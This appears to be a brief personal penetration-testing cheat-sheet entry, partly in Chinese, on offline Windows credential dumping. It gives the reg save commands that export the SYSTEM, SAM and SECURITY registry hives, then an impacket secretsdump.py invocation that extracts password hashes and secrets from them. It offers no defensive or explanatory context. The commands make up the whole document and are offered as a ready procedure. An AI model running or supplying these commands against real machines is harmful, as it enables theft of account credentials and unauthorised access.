# windows

mimikatz



离线抓取

```
大概2003

reg save HKLM\SYSTEM sys.hiv  
reg save HKLM\SAM sam.hiv  
reg save hklm\security security.hiv  

python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
```
